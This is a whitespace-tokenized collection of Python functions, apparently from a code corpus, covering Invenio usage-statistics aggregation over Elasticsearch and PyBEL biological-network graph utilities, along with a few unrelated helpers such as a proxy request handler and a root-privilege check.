def run ( self , start_date = None , end_date = None , update_bookmark = True ) : # If no events have been indexed there is nothing to aggregate if not Index ( self . event_index , using = self . client ) . exists ( ) : return lower_limit = start_date or self . get_bookmark ( ) # Stop here if no bookmark could be estimated. if lower_limit is None : return upper_limit = min ( end_date or datetime . datetime . max , # ignore if `None` datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) , datetime . datetime . combine ( lower_limit + datetime . timedelta ( self . batch_size ) , datetime . datetime . min . time ( ) ) ) while upper_limit <= datetime . datetime . utcnow ( ) : self . indices = set ( ) self . new_bookmark = upper_limit . strftime ( self . doc_id_suffix ) bulk ( self . client , self . agg_iter ( lower_limit , upper_limit ) , stats_only = True , chunk_size = 50 ) # Flush all indices which have been modified current_search_client . indices . flush ( index = ',' . join ( self . indices ) , wait_if_ongoing = True ) if update_bookmark : self . set_bookmark ( ) self . indices = set ( ) lower_limit = lower_limit + datetime . timedelta ( self . batch_size ) upper_limit = min ( end_date or datetime . datetime . max , # ignore if `None`` datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) , lower_limit + datetime . timedelta ( self . batch_size ) ) if lower_limit > upper_limit : break
def list_bookmarks ( self , start_date = None , end_date = None , limit = None ) : query = Search ( using = self . client , index = self . aggregation_alias , doc_type = self . bookmark_doc_type ) . sort ( { 'date' : { 'order' : 'desc' } } ) range_args = { } if start_date : range_args [ 'gte' ] = self . _format_range_dt ( start_date . replace ( microsecond = 0 ) ) if end_date : range_args [ 'lte' ] = self . _format_range_dt ( end_date . replace ( microsecond = 0 ) ) if range_args : query = query . filter ( 'range' , date = range_args ) return query [ 0 : limit ] . execute ( ) if limit else query . scan ( )
def delete ( self , start_date = None , end_date = None ) : aggs_query = Search ( using = self . client , index = self . aggregation_alias , doc_type = self . aggregation_doc_type ) . extra ( _source = False ) range_args = { } if start_date : range_args [ 'gte' ] = self . _format_range_dt ( start_date . replace ( microsecond = 0 ) ) if end_date : range_args [ 'lte' ] = self . _format_range_dt ( end_date . replace ( microsecond = 0 ) ) if range_args : aggs_query = aggs_query . filter ( 'range' , timestamp = range_args ) bookmarks_query = Search ( using = self . client , index = self . aggregation_alias , doc_type = self . bookmark_doc_type ) . sort ( { 'date' : { 'order' : 'desc' } } ) if range_args : bookmarks_query = bookmarks_query . filter ( 'range' , date = range_args ) def _delete_actions ( ) : for query in ( aggs_query , bookmarks_query ) : affected_indices = set ( ) for doc in query . scan ( ) : affected_indices . add ( doc . meta . index ) yield dict ( _index = doc . meta . index , _op_type = 'delete' , _id = doc . meta . id , _type = doc . meta . doc_type ) current_search_client . indices . flush ( index = ',' . join ( affected_indices ) , wait_if_ongoing = True ) bulk ( self . client , _delete_actions ( ) , refresh = True )
def get ( self , timeout = None ) : result = None try : result = self . _result . get ( True , timeout = timeout ) except Empty : raise Timeout ( ) if isinstance ( result , Failure ) : six . reraise ( * result . exc_info ) else : return result
def _events_process ( event_types = None , eager = False ) : event_types = event_types or list ( current_stats . enabled_events ) if eager : process_events . apply ( ( event_types , ) , throw = True ) click . secho ( 'Events processed successfully.' , fg = 'green' ) else : process_events . delay ( event_types ) click . secho ( 'Events processing task sent...' , fg = 'yellow' )
def _aggregations_process ( aggregation_types = None , start_date = None , end_date = None , update_bookmark = False , eager = False ) : aggregation_types = ( aggregation_types or list ( current_stats . enabled_aggregations ) ) if eager : aggregate_events . apply ( ( aggregation_types , ) , dict ( start_date = start_date , end_date = end_date , update_bookmark = update_bookmark ) , throw = True ) click . secho ( 'Aggregations processed successfully.' , fg = 'green' ) else : aggregate_events . delay ( aggregation_types , start_date = start_date , end_date = end_date ) click . secho ( 'Aggregations processing task sent...' , fg = 'yellow' )
def _aggregations_delete ( aggregation_types = None , start_date = None , end_date = None ) : aggregation_types = ( aggregation_types or list ( current_stats . enabled_aggregations ) ) for a in aggregation_types : aggr_cfg = current_stats . aggregations [ a ] aggregator = aggr_cfg . aggregator_class ( name = aggr_cfg . name , * * aggr_cfg . aggregator_config ) aggregator . delete ( start_date , end_date )
def _aggregations_list_bookmarks ( aggregation_types = None , start_date = None , end_date = None , limit = None ) : aggregation_types = ( aggregation_types or list ( current_stats . enabled_aggregations ) ) for a in aggregation_types : aggr_cfg = current_stats . aggregations [ a ] aggregator = aggr_cfg . aggregator_class ( name = aggr_cfg . name , * * aggr_cfg . aggregator_config ) bookmarks = aggregator . list_bookmarks ( start_date , end_date , limit ) click . echo ( '{}:' . format ( a ) ) for b in bookmarks : click . echo ( ' - {}' . format ( b . date ) )
def _events_config ( self ) : # import iter_entry_points here so that it can be mocked in tests result = { } for ep in iter_entry_points ( group = self . entry_point_group_events ) : for cfg in ep . load ( ) ( ) : if cfg [ 'event_type' ] not in self . enabled_events : continue elif cfg [ 'event_type' ] in result : raise DuplicateEventError ( 'Duplicate event {0} in entry point ' '{1}' . format ( cfg [ 'event_type' ] , ep . name ) ) # Update the default configuration with env/overlay config. cfg . update ( self . enabled_events [ cfg [ 'event_type' ] ] or { } ) result [ cfg [ 'event_type' ] ] = cfg return result
def _aggregations_config ( self ) : result = { } for ep in iter_entry_points ( group = self . entry_point_group_aggs ) : for cfg in ep . load ( ) ( ) : if cfg [ 'aggregation_name' ] not in self . enabled_aggregations : continue elif cfg [ 'aggregation_name' ] in result : raise DuplicateAggregationError ( 'Duplicate aggregation {0} in entry point ' '{1}' . format ( cfg [ 'event_type' ] , ep . name ) ) # Update the default configuration with env/overlay config. cfg . update ( self . enabled_aggregations [ cfg [ 'aggregation_name' ] ] or { } ) result [ cfg [ 'aggregation_name' ] ] = cfg return result
def _queries_config ( self ) : result = { } for ep in iter_entry_points ( group = self . entry_point_group_queries ) : for cfg in ep . load ( ) ( ) : if cfg [ 'query_name' ] not in self . enabled_queries : continue elif cfg [ 'query_name' ] in result : raise DuplicateQueryError ( 'Duplicate query {0} in entry point ' '{1}' . format ( cfg [ 'query' ] , ep . name ) ) # Update the default configuration with env/overlay config. cfg . update ( self . enabled_queries [ cfg [ 'query_name' ] ] or { } ) result [ cfg [ 'query_name' ] ] = cfg return result
def consume ( self , event_type , no_ack = True , payload = True ) : assert event_type in self . events return current_queues . queues [ 'stats-{}' . format ( event_type ) ] . consume ( payload = payload )
def init_app ( self , app , entry_point_group_events = 'invenio_stats.events' , entry_point_group_aggs = 'invenio_stats.aggregations' , entry_point_group_queries = 'invenio_stats.queries' ) : self . init_config ( app ) state = _InvenioStatsState ( app , entry_point_group_events = entry_point_group_events , entry_point_group_aggs = entry_point_group_aggs , entry_point_group_queries = entry_point_group_queries ) self . _state = app . extensions [ 'invenio-stats' ] = state if app . config [ 'STATS_REGISTER_RECEIVERS' ] : signal_receivers = { key : value for key , value in app . config . get ( 'STATS_EVENTS' , { } ) . items ( ) if 'signal' in value } register_receivers ( app , signal_receivers ) return state
def get_anonymization_salt ( ts ) : salt_key = 'stats:salt:{}' . format ( ts . date ( ) . isoformat ( ) ) salt = current_cache . get ( salt_key ) if not salt : salt_bytes = os . urandom ( 32 ) salt = b64encode ( salt_bytes ) . decode ( 'utf-8' ) current_cache . set ( salt_key , salt , timeout = 60 * 60 * 24 ) return salt
def get_geoip ( ip ) : reader = geolite2 . reader ( ) ip_data = reader . get ( ip ) or { } return ip_data . get ( 'country' , { } ) . get ( 'iso_code' )
def register_templates ( ) : event_templates = [ current_stats . _events_config [ e ] [ 'templates' ] for e in current_stats . _events_config ] aggregation_templates = [ current_stats . _aggregations_config [ a ] [ 'templates' ] for a in current_stats . _aggregations_config ] return event_templates + aggregation_templates
def process_events ( event_types ) : results = [ ] for e in event_types : processor = current_stats . events [ e ] . processor_class ( * * current_stats . events [ e ] . processor_config ) results . append ( ( e , processor . run ( ) ) ) return results
def aggregate_events ( aggregations , start_date = None , end_date = None , update_bookmark = True ) : start_date = dateutil_parse ( start_date ) if start_date else None end_date = dateutil_parse ( end_date ) if end_date else None results = [ ] for a in aggregations : aggr_cfg = current_stats . aggregations [ a ] aggregator = aggr_cfg . aggregator_class ( name = aggr_cfg . name , * * aggr_cfg . aggregator_config ) results . append ( aggregator . run ( start_date , end_date , update_bookmark ) ) return results
def _handle_request ( self , scheme , netloc , path , headers , body = None , method = "GET" ) : backend_url = "{}://{}{}" . format ( scheme , netloc , path ) try : response = self . http_request . request ( backend_url , method = method , body = body , headers = dict ( headers ) ) self . _return_response ( response ) except Exception as e : body = "Invalid response from backend: '{}' Server might be busy" . format ( e . message ) logging . debug ( body ) self . send_error ( httplib . SERVICE_UNAVAILABLE , body )
def hash_id ( iso_timestamp , msg ) : return '{0}-{1}' . format ( iso_timestamp , hashlib . sha1 ( msg . get ( 'unique_id' ) . encode ( 'utf-8' ) + str ( msg . get ( 'visitor_id' ) ) . encode ( 'utf-8' ) ) . hexdigest ( ) )
def run ( self ) : return elasticsearch . helpers . bulk ( self . client , self . actionsiter ( ) , stats_only = True , chunk_size = 50 )
def register_events ( ) : return [ dict ( event_type = 'file-download' , templates = 'invenio_stats.contrib.file_download' , processor_class = EventsIndexer , processor_config = dict ( preprocessors = [ flag_robots , anonymize_user , build_file_unique_id ] ) ) , dict ( event_type = 'record-view' , templates = 'invenio_stats.contrib.record_view' , processor_class = EventsIndexer , processor_config = dict ( preprocessors = [ flag_robots , anonymize_user , build_record_unique_id ] ) ) ]
def register_aggregations ( ) : return [ dict ( aggregation_name = 'file-download-agg' , templates = 'invenio_stats.contrib.aggregations.aggr_file_download' , aggregator_class = StatAggregator , aggregator_config = dict ( client = current_search_client , event = 'file-download' , aggregation_field = 'unique_id' , aggregation_interval = 'day' , copy_fields = dict ( file_key = 'file_key' , bucket_id = 'bucket_id' , file_id = 'file_id' , ) , metric_aggregation_fields = { 'unique_count' : ( 'cardinality' , 'unique_session_id' , { 'precision_threshold' : 1000 } ) , 'volume' : ( 'sum' , 'size' , { } ) , } , ) ) , dict ( aggregation_name = 'record-view-agg' , templates = 'invenio_stats.contrib.aggregations.aggr_record_view' , aggregator_class = StatAggregator , aggregator_config = dict ( client = current_search_client , event = 'record-view' , aggregation_field = 'unique_id' , aggregation_interval = 'day' , copy_fields = dict ( record_id = 'record_id' , pid_type = 'pid_type' , pid_value = 'pid_value' , ) , metric_aggregation_fields = { 'unique_count' : ( 'cardinality' , 'unique_session_id' , { 'precision_threshold' : 1000 } ) , } , ) ) ]
def declare_queues ( ) : return [ dict ( name = 'stats-{0}' . format ( event [ 'event_type' ] ) , exchange = current_stats . exchange ) for event in current_stats . _events_config . values ( ) ]
def validate_arguments ( self , interval , start_date , end_date , * * kwargs ) : if interval not in self . allowed_intervals : raise InvalidRequestInputError ( 'Invalid aggregation time interval for statistic {}.' ) . format ( self . query_name ) if set ( kwargs ) < set ( self . required_filters ) : raise InvalidRequestInputError ( 'Missing one of the required parameters {0} in ' 'query {1}' . format ( set ( self . required_filters . keys ( ) ) , self . query_name ) )
def build_query ( self , interval , start_date , end_date , * * kwargs ) : agg_query = Search ( using = self . client , index = self . index , doc_type = self . doc_type ) [ 0 : 0 ] if start_date is not None or end_date is not None : time_range = { } if start_date is not None : time_range [ 'gte' ] = start_date . isoformat ( ) if end_date is not None : time_range [ 'lte' ] = end_date . isoformat ( ) agg_query = agg_query . filter ( 'range' , * * { self . time_field : time_range } ) for modifier in self . query_modifiers : agg_query = modifier ( agg_query , * * kwargs ) base_agg = agg_query . aggs . bucket ( 'histogram' , 'date_histogram' , field = self . time_field , interval = interval ) for destination , ( metric , field , opts ) in self . metric_fields . items ( ) : base_agg . metric ( destination , metric , field = field , * * opts ) if self . copy_fields : base_agg . metric ( 'top_hit' , 'top_hits' , size = 1 , sort = { 'timestamp' : 'desc' } ) for query_param , filtered_field in self . required_filters . items ( ) : if query_param in kwargs : agg_query = agg_query . filter ( 'term' , * * { filtered_field : kwargs [ query_param ] } ) return agg_query
def process_query_result ( self , query_result , interval , start_date , end_date ) : def build_buckets ( agg ) : """Build recursively result buckets.""" bucket_result = dict ( key = agg [ 'key' ] , date = agg [ 'key_as_string' ] , ) for metric in self . metric_fields : bucket_result [ metric ] = agg [ metric ] [ 'value' ] if self . copy_fields and agg [ 'top_hit' ] [ 'hits' ] [ 'hits' ] : doc = agg [ 'top_hit' ] [ 'hits' ] [ 'hits' ] [ 0 ] [ '_source' ] for destination , source in self . copy_fields . items ( ) : if isinstance ( source , six . string_types ) : bucket_result [ destination ] = doc [ source ] else : bucket_result [ destination ] = source ( bucket_result , doc ) return bucket_result # Add copy_fields buckets = query_result [ 'aggregations' ] [ 'histogram' ] [ 'buckets' ] return dict ( interval = interval , key_type = 'date' , start_date = start_date . isoformat ( ) if start_date else None , end_date = end_date . isoformat ( ) if end_date else None , buckets = [ build_buckets ( b ) for b in buckets ] )
def validate_arguments ( self , start_date , end_date , * * kwargs ) : if set ( kwargs ) < set ( self . required_filters ) : raise InvalidRequestInputError ( 'Missing one of the required parameters {0} in ' 'query {1}' . format ( set ( self . required_filters . keys ( ) ) , self . query_name ) )
def build_query ( self , start_date , end_date , * * kwargs ) : agg_query = Search ( using = self . client , index = self . index , doc_type = self . doc_type ) [ 0 : 0 ] if start_date is not None or end_date is not None : time_range = { } if start_date is not None : time_range [ 'gte' ] = start_date . isoformat ( ) if end_date is not None : time_range [ 'lte' ] = end_date . isoformat ( ) agg_query = agg_query . filter ( 'range' , * * { self . time_field : time_range } ) for modifier in self . query_modifiers : agg_query = modifier ( agg_query , * * kwargs ) base_agg = agg_query . aggs def _apply_metric_aggs ( agg ) : for dst , ( metric , field , opts ) in self . metric_fields . items ( ) : agg . metric ( dst , metric , field = field , * * opts ) _apply_metric_aggs ( base_agg ) if self . aggregated_fields : cur_agg = base_agg for term in self . aggregated_fields : cur_agg = cur_agg . bucket ( term , 'terms' , field = term , size = 0 ) _apply_metric_aggs ( cur_agg ) if self . copy_fields : base_agg . metric ( 'top_hit' , 'top_hits' , size = 1 , sort = { 'timestamp' : 'desc' } ) for query_param , filtered_field in self . required_filters . items ( ) : if query_param in kwargs : agg_query = agg_query . filter ( 'term' , * * { filtered_field : kwargs [ query_param ] } ) return agg_query
def process_query_result ( self , query_result , start_date , end_date ) : def build_buckets ( agg , fields , bucket_result ) : """Build recursively result buckets.""" # Add metric results for current bucket for metric in self . metric_fields : bucket_result [ metric ] = agg [ metric ] [ 'value' ] if fields : current_level = fields [ 0 ] bucket_result . update ( dict ( type = 'bucket' , field = current_level , key_type = 'terms' , buckets = [ build_buckets ( b , fields [ 1 : ] , dict ( key = b [ 'key' ] ) ) for b in agg [ current_level ] [ 'buckets' ] ] ) ) return bucket_result # Add copy_fields aggs = query_result [ 'aggregations' ] result = dict ( start_date = start_date . isoformat ( ) if start_date else None , end_date = end_date . isoformat ( ) if end_date else None , ) if self . copy_fields and aggs [ 'top_hit' ] [ 'hits' ] [ 'hits' ] : doc = aggs [ 'top_hit' ] [ 'hits' ] [ 'hits' ] [ 0 ] [ '_source' ] for destination , source in self . copy_fields . items ( ) : if isinstance ( source , six . string_types ) : result [ destination ] = doc [ source ] else : result [ destination ] = source ( result , doc ) return build_buckets ( aggs , self . aggregated_fields , result )
def run ( self , start_date = None , end_date = None , * * kwargs ) : start_date = self . extract_date ( start_date ) if start_date else None end_date = self . extract_date ( end_date ) if end_date else None self . validate_arguments ( start_date , end_date , * * kwargs ) agg_query = self . build_query ( start_date , end_date , * * kwargs ) query_result = agg_query . execute ( ) . to_dict ( ) res = self . process_query_result ( query_result , start_date , end_date ) return res
def file_download_event_builder ( event , sender_app , obj = None , * * kwargs ) : event . update ( dict ( # When: timestamp = datetime . datetime . utcnow ( ) . isoformat ( ) , # What: bucket_id = str ( obj . bucket_id ) , file_id = str ( obj . file_id ) , file_key = obj . key , size = obj . file . size , referrer = request . referrer , # Who: * * get_user ( ) ) ) return event
def record_view_event_builder ( event , sender_app , pid = None , record = None , * * kwargs ) : event . update ( dict ( # When: timestamp = datetime . datetime . utcnow ( ) . isoformat ( ) , # What: record_id = str ( record . id ) , pid_type = pid . pid_type , pid_value = str ( pid . pid_value ) , referrer = request . referrer , # Who: * * get_user ( ) ) ) return event
def _is_root ( ) : import os import ctypes try : return os . geteuid ( ) == 0 except AttributeError : return ctypes . windll . shell32 . IsUserAnAdmin ( ) != 0 return False
def to_jupyter ( graph : BELGraph , chart : Optional [ str ] = None ) -> Javascript : with open ( os . path . join ( HERE , 'render_with_javascript.js' ) , 'rt' ) as f : js_template = Template ( f . read ( ) ) return Javascript ( js_template . render ( * * _get_context ( graph , chart = chart ) ) )
def prerender ( graph : BELGraph ) -> Mapping [ str , Mapping [ str , Any ] ] : import bio2bel_hgnc from bio2bel_hgnc . models import HumanGene graph : BELGraph = graph . copy ( ) enrich_protein_and_rna_origins ( graph ) collapse_all_variants ( graph ) genes : Set [ Gene ] = get_nodes_by_function ( graph , GENE ) hgnc_symbols = { gene . name for gene in genes if gene . namespace . lower ( ) == 'hgnc' } result = { } hgnc_manager = bio2bel_hgnc . Manager ( ) human_genes = ( hgnc_manager . session . query ( HumanGene . symbol , HumanGene . location ) . filter ( HumanGene . symbol . in_ ( hgnc_symbols ) ) . all ( ) ) for human_gene in human_genes : result [ human_gene . symbol ] = { 'name' : human_gene . symbol , 'chr' : ( human_gene . location . split ( 'q' ) [ 0 ] if 'q' in human_gene . location else human_gene . location . split ( 'p' ) [ 0 ] ) , } df = get_df ( ) for _ , ( gene_id , symbol , start , stop ) in df [ df [ 'Symbol' ] . isin ( hgnc_symbols ) ] . iterrows ( ) : result [ symbol ] [ 'start' ] = start result [ symbol ] [ 'stop' ] = stop return result
def get_correlation_graph ( graph : BELGraph ) -> Graph : result = Graph ( ) for u , v , d in graph . edges ( data = True ) : if d [ RELATION ] not in CORRELATIVE_RELATIONS : continue if not result . has_edge ( u , v ) : result . add_edge ( u , v , * * { d [ RELATION ] : True } ) elif d [ RELATION ] not in result [ u ] [ v ] : log . log ( 5 , 'broken correlation relation for %s, %s' , u , v ) result [ u ] [ v ] [ d [ RELATION ] ] = True result [ v ] [ u ] [ d [ RELATION ] ] = True return result
def get_correlation_triangles ( graph : BELGraph ) -> SetOfNodeTriples : return { tuple ( sorted ( [ n , u , v ] , key = str ) ) for n in graph for u , v in itt . combinations ( graph [ n ] , 2 ) if graph . has_edge ( u , v ) }
def summarize_stability ( graph : BELGraph ) -> Mapping [ str , int ] : regulatory_pairs = get_regulatory_pairs ( graph ) chaotic_pairs = get_chaotic_pairs ( graph ) dampened_pairs = get_dampened_pairs ( graph ) contraditory_pairs = get_contradiction_summary ( graph ) separately_unstable_triples = get_separate_unstable_correlation_triples ( graph ) mutually_unstable_triples = get_mutually_unstable_correlation_triples ( graph ) jens_unstable_triples = get_jens_unstable ( graph ) increase_mismatch_triples = get_increase_mismatch_triplets ( graph ) decrease_mismatch_triples = get_decrease_mismatch_triplets ( graph ) chaotic_triples = get_chaotic_triplets ( graph ) dampened_triples = get_dampened_triplets ( graph ) return { 'Regulatory Pairs' : _count_or_len ( regulatory_pairs ) , 'Chaotic Pairs' : _count_or_len ( chaotic_pairs ) , 'Dampened Pairs' : _count_or_len ( dampened_pairs ) , 'Contradictory Pairs' : _count_or_len ( contraditory_pairs ) , 'Separately Unstable Triples' : _count_or_len ( separately_unstable_triples ) , 'Mutually Unstable Triples' : _count_or_len ( mutually_unstable_triples ) , 'Jens Unstable Triples' : _count_or_len ( jens_unstable_triples ) , 'Increase Mismatch Triples' : _count_or_len ( increase_mismatch_triples ) , 'Decrease Mismatch Triples' : _count_or_len ( decrease_mismatch_triples ) , 'Chaotic Triples' : _count_or_len ( chaotic_triples ) , 'Dampened Triples' : _count_or_len ( dampened_triples ) }
def flatten_list_abundance ( node : ListAbundance ) -> ListAbundance : return node . __class__ ( list ( chain . from_iterable ( ( flatten_list_abundance ( member ) . members if isinstance ( member , ListAbundance ) else [ member ] ) for member in node . members ) ) )
def list_abundance_expansion ( graph : BELGraph ) -> None : mapping = { node : flatten_list_abundance ( node ) for node in graph if isinstance ( node , ListAbundance ) } relabel_nodes ( graph , mapping , copy = False )
def list_abundance_cartesian_expansion ( graph : BELGraph ) -> None : for u , v , k , d in list ( graph . edges ( keys = True , data = True ) ) : if CITATION not in d : continue if isinstance ( u , ListAbundance ) and isinstance ( v , ListAbundance ) : for u_member , v_member in itt . product ( u . members , v . members ) : graph . add_qualified_edge ( u_member , v_member , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( u , ListAbundance ) : for member in u . members : graph . add_qualified_edge ( member , v , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( v , ListAbundance ) : for member in v . members : graph . add_qualified_edge ( u , member , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) _remove_list_abundance_nodes ( graph )
def _reaction_cartesion_expansion_unqualified_helper ( graph : BELGraph , u : BaseEntity , v : BaseEntity , d : dict , ) -> None : if isinstance ( u , Reaction ) and isinstance ( v , Reaction ) : enzymes = _get_catalysts_in_reaction ( u ) | _get_catalysts_in_reaction ( v ) for reactant , product in chain ( itt . product ( u . reactants , u . products ) , itt . product ( v . reactants , v . products ) ) : if reactant in enzymes or product in enzymes : continue graph . add_unqualified_edge ( reactant , product , INCREASES ) for product , reactant in itt . product ( u . products , u . reactants ) : if reactant in enzymes or product in enzymes : continue graph . add_unqualified_edge ( product , reactant , d [ RELATION ] , ) elif isinstance ( u , Reaction ) : enzymes = _get_catalysts_in_reaction ( u ) for product in u . products : # Skip create increases edges between enzymes if product in enzymes : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips hasReactant, hasProduct edges if v not in u . products and v not in u . reactants : graph . add_unqualified_edge ( product , v , INCREASES ) for reactant in u . reactants : graph . add_unqualified_edge ( reactant , product , INCREASES ) elif isinstance ( v , Reaction ) : enzymes = _get_catalysts_in_reaction ( v ) for reactant in v . reactants : # Skip create increases edges between enzymes if reactant in enzymes : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips hasReactant, hasProduct edges if u not in v . products and u not in v . reactants : graph . add_unqualified_edge ( u , reactant , INCREASES ) for product in v . products : graph . add_unqualified_edge ( reactant , product , INCREASES )
def _get_catalysts_in_reaction ( reaction : Reaction ) -> Set [ BaseAbundance ] : return { reactant for reactant in reaction . reactants if reactant in reaction . products }
def reaction_cartesian_expansion ( graph : BELGraph , accept_unqualified_edges : bool = True ) -> None : for u , v , d in list ( graph . edges ( data = True ) ) : # Deal with unqualified edges if CITATION not in d and accept_unqualified_edges : _reaction_cartesion_expansion_unqualified_helper ( graph , u , v , d ) continue if isinstance ( u , Reaction ) and isinstance ( v , Reaction ) : catalysts = _get_catalysts_in_reaction ( u ) | _get_catalysts_in_reaction ( v ) for reactant , product in chain ( itt . product ( u . reactants , u . products ) , itt . product ( v . reactants , v . products ) ) : if reactant in catalysts or product in catalysts : continue graph . add_increases ( reactant , product , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) for product , reactant in itt . product ( u . products , u . reactants ) : if reactant in catalysts or product in catalysts : continue graph . add_qualified_edge ( product , reactant , relation = d [ RELATION ] , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( u , Reaction ) : catalysts = _get_catalysts_in_reaction ( u ) for product in u . products : # Skip create increases edges between enzymes if product in catalysts : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips hasReactant, hasProduct edges if v not in u . products and v not in u . reactants : graph . add_increases ( product , v , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) for reactant in u . reactants : graph . add_increases ( reactant , product , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) elif isinstance ( v , Reaction ) : for reactant in v . reactants : catalysts = _get_catalysts_in_reaction ( v ) # Skip create increases edges between enzymes if reactant in catalysts : continue # Only add edge between v and reaction if the node is not part of the reaction # In practice skips hasReactant, hasProduct edges if u not in v . products and u not in v . reactants : graph . add_increases ( u , reactant , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) for product in v . products : graph . add_increases ( reactant , product , citation = d . get ( CITATION ) , evidence = d . get ( EVIDENCE ) , annotations = d . get ( ANNOTATIONS ) , ) _remove_reaction_nodes ( graph )
def get_graphs_by_ids ( self , network_ids : Iterable [ int ] ) -> List [ BELGraph ] : return [ self . networks [ network_id ] for network_id in network_ids ]
def count_author_publications ( graph : BELGraph ) -> typing . Counter [ str ] : authors = group_as_dict ( _iter_author_publiations ( graph ) ) return Counter ( count_dict_values ( count_defaultdict ( authors ) ) )
def count_citation_years ( graph : BELGraph ) -> typing . Counter [ int ] : result = defaultdict ( set ) for _ , _ , data in graph . edges ( data = True ) : if CITATION not in data or CITATION_DATE not in data [ CITATION ] : continue try : dt = _ensure_datetime ( data [ CITATION ] [ CITATION_DATE ] ) result [ dt . year ] . add ( ( data [ CITATION ] [ CITATION_TYPE ] , data [ CITATION ] [ CITATION_REFERENCE ] ) ) except Exception : continue return count_dict_values ( result )
def get_citation_years ( graph : BELGraph ) -> List [ Tuple [ int , int ] ] : return create_timeline ( count_citation_years ( graph ) )
def count_confidences ( graph : BELGraph ) -> typing . Counter [ str ] : return Counter ( ( 'None' if ANNOTATIONS not in data or 'Confidence' not in data [ ANNOTATIONS ] else list ( data [ ANNOTATIONS ] [ 'Confidence' ] ) [ 0 ] ) for _ , _ , data in graph . edges ( data = True ) if CITATION in data # don't bother with unqualified statements )
def update_context ( universe : BELGraph , graph : BELGraph ) : for namespace in get_namespaces ( graph ) : if namespace in universe . namespace_url : graph . namespace_url [ namespace ] = universe . namespace_url [ namespace ] elif namespace in universe . namespace_pattern : graph . namespace_pattern [ namespace ] = universe . namespace_pattern [ namespace ] else : log . warning ( 'namespace: %s missing from universe' , namespace ) for annotation in get_annotations ( graph ) : if annotation in universe . annotation_url : graph . annotation_url [ annotation ] = universe . annotation_url [ annotation ] elif annotation in universe . annotation_pattern : graph . annotation_pattern [ annotation ] = universe . annotation_pattern [ annotation ] elif annotation in universe . annotation_list : graph . annotation_list [ annotation ] = universe . annotation_list [ annotation ] else : log . warning ( 'annotation: %s missing from universe' , annotation )
def count_top_centrality ( graph : BELGraph , number : Optional [ int ] = 30 ) -> Mapping [ BaseEntity , int ] : dd = nx . betweenness_centrality ( graph ) dc = Counter ( dd ) return dict ( dc . most_common ( number ) )
def get_modifications_count ( graph : BELGraph ) -> Mapping [ str , int ] : return remove_falsy_values ( { 'Translocations' : len ( get_translocated ( graph ) ) , 'Degradations' : len ( get_degradations ( graph ) ) , 'Molecular Activities' : len ( get_activities ( graph ) ) , } )
def remove_falsy_values ( counter : Mapping [ Any , int ] ) -> Mapping [ Any , int ] : return { label : count for label , count in counter . items ( ) if count }
def _collapse_variants_by_function ( graph : BELGraph , func : str ) -> None : for parent_node , variant_node , data in graph . edges ( data = True ) : if data [ RELATION ] == HAS_VARIANT and parent_node . function == func : collapse_pair ( graph , from_node = variant_node , to_node = parent_node )
def _collapse_edge_passing_predicates ( graph : BELGraph , edge_predicates : EdgePredicates = None ) -> None : for u , v , _ in filter_edges ( graph , edge_predicates = edge_predicates ) : collapse_pair ( graph , survivor = u , victim = v )
def collapse_entrez_equivalencies ( graph : BELGraph ) : relation_filter = build_relation_predicate ( EQUIVALENT_TO ) source_namespace_filter = build_source_namespace_filter ( [ 'EGID' , 'EG' , 'ENTREZ' ] ) edge_predicates = [ relation_filter , source_namespace_filter , ] _collapse_edge_passing_predicates ( graph , edge_predicates = edge_predicates )
def collapse_nodes_with_same_names ( graph : BELGraph ) -> None : survivor_mapping = defaultdict ( set ) # Collapse mapping dict victims = set ( ) # Things already mapped while iterating it = tqdm ( itt . combinations ( graph , r = 2 ) , total = graph . number_of_nodes ( ) * ( graph . number_of_nodes ( ) - 1 ) / 2 ) for a , b in it : if b in victims : continue a_name , b_name = a . get ( NAME ) , b . get ( NAME ) if not a_name or not b_name or a_name . lower ( ) != b_name . lower ( ) : continue if a . keys ( ) != b . keys ( ) : # not same version (might have variants) continue # Ensure that the values in the keys are also the same for k in set ( a . keys ( ) ) - { NAME , NAMESPACE } : if a [ k ] != b [ k ] : # something different continue survivor_mapping [ a ] . add ( b ) # Keep track of things that has been already mapped victims . add ( b ) collapse_nodes ( graph , survivor_mapping )
def main ( output ) : from hbp_knowledge import get_graph graph = get_graph ( ) text = to_html ( graph ) print ( text , file = output )
def enrich_complexes ( graph : BELGraph ) -> None : nodes = list ( get_nodes_by_function ( graph , COMPLEX ) ) for u in nodes : for v in u . members : graph . add_has_component ( u , v )
def enrich_composites ( graph : BELGraph ) : nodes = list ( get_nodes_by_function ( graph , COMPOSITE ) ) for u in nodes : for v in u . members : graph . add_has_component ( u , v )
def enrich_reactions ( graph : BELGraph ) : nodes = list ( get_nodes_by_function ( graph , REACTION ) ) for u in nodes : for v in u . reactants : graph . add_has_reactant ( u , v ) for v in u . products : graph . add_has_product ( u , v )
def get_namespaces_with_incorrect_names ( graph : BELGraph ) -> Set [ str ] : return { exc . namespace for _ , exc , _ in graph . warnings if isinstance ( exc , ( MissingNamespaceNameWarning , MissingNamespaceRegexWarning ) ) }
def get_undefined_namespaces ( graph : BELGraph ) -> Set [ str ] : return { exc . namespace for _ , exc , _ in graph . warnings if isinstance ( exc , UndefinedNamespaceWarning ) }
